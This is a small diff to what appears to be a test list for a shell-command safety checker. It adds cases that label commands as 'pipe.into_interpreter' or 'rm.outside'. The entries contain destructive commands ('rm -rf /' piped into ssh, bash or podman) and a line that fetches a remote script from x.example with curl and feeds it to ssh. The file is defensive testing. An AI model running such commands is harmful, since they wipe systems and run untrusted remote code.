@@ -229,6 +229,8 @@ STDIN_ASKS = [
     ("echo 'rm -rf /' | sshpass -p pw ssh host", "pipe.into_interpreter"),
     ("echo 'rm -rf /' | podman exec -i app sh", "pipe.into_interpreter"),
     ("ssh host < <(curl -s https://x.example/i.sh)", "pipe.into_interpreter"),
+    ("bash -c 'ssh host' <<< 'rm -rf /'", "rm.outside"),
+    ("echo 'rm -rf /' | bash -c 'ssh host'", "pipe.into_interpreter"),
 ]
 
 
